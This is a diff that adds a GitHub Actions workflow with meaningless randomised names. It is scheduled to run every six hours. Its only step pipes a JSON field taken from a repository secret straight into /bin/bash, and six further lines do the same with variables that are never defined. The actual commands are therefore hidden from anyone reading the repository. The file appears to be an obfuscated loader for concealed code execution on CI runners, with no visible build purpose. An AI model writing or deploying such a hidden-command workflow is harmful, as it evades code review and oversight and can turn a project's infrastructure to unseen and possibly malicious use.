@@ -1,0 +1,24 @@
+name: huyurenzht
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: huyurenzht
+        env:
+          fj46258: ${{ secrets.fj46258 }}
+        run: |
+          echo $fj46258 | jq -r .finmb5 | /bin/bash
+          echo $wjp905 | jq -r .w055 | /bin/bash
+          echo $ivdl6 | jq -r .bogkw929 | /bin/bash
+          echo $a0 | jq -r .y047 | /bin/bash
+          echo $jr98 | jq -r .ksv4 | /bin/bash
+          echo $desaf81 | jq -r .wpy142 | /bin/bash
+          echo $d825 | jq -r .lntnf98420 | /bin/bash
+
